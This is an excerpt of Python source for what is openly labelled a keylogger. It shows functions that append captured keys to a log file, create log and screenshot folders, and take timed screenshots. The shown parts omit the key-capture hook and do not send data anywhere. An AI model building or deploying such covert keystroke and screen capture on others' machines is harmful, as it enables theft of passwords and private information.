...
def write_file(keys):                  #To write the keys to the Files
    with open("C:/Users/Mohit/Desktop/Keylogger/log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
...
class keylogger_main:
    ...
    def _build_logs(self):             #To create the directory which contains all the screenshots and log files 
        if not os.path.exists('C:/Users/Mohit/Desktop/Keylogger'):
            os.mkdir('C:/Users/Mohit/Desktop/Keylogger')
            os.mkdir('C:/Users/Mohit/Desktop/Keylogger/Screenshots')
    ...
    def _Screenshot(self):           #Main Function to start thr Screenshot tracker
        sct=mss()
        sct.shot(output='C:/Users/Mohit/Desktop/Keylogger/Screenshots/{}.png'.format(time.time()))
